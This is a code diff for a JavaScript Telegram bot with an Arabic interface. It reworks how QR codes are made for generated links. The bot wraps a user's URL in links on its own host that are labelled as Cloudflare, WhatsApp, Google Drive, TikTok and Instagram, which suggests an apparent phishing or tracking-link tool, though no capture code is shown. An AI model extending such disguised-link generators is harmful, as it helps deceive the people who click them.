@@ -463,7 +463,9 @@ bot.on('callback_query', async (q) => {
     return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});
 
   if (data.startsWith("qr:")) {
-    const link = decodeURIComponent(data.replace("qr:",""));
+    const uid = data.replace("qr:","").trim();
+    const link = lastLink.get(uid) || lastLink.get(String(chatId));
+    if (!link) return bot.sendMessage(chatId, "❌ لا يوجد رابط محفوظ. أنشئ رابطاً أولاً.");
     const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(link)}`;
     return bot.sendPhoto(chatId, qrUrl, { caption: `📷 QR Code\n\n${link}` }).catch(() => {
       bot.sendMessage(chatId, `📷 QR: ${qrUrl}`);
@@ -474,6 +476,8 @@ bot.on('callback_query', async (q) => {
 bot.on('polling_error', () => {});
 
 // ── Link Creation ─────────────────────────────────────────────────────────────
+
+const lastLink = new Map(); // cid -> cloudflare link (for QR)
 
 async function createLink(cid, msg) {
   if (!msg || typeof msg !== 'string') return;
@@ -489,11 +493,12 @@ async function createLink(cid, msg) {
     const dlLink = `${hostURL}/dl/${url}`;
     const ttLink = `${hostURL}/tt/${url}`;
     const igLink = `${hostURL}/ig/${url}`;
+    lastLink.set(String(cid), cLink);
     bot.sendMessage(cid,
-      `✅ تم إنشاء الروابط!\n🔗 URL: ${msg}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}`,
+      `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}`,
       { reply_markup: JSON.stringify({ inline_keyboard: [
         [{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }],
-        [{ text:"📷 QR Code للرابط الرئيسي", callback_data:`qr:${encodeURIComponent(cLink)}` }]
+        [{ text:"📷 QR Code", callback_data:`qr:${cid}` }]
       ] }) }
     );
   } else {
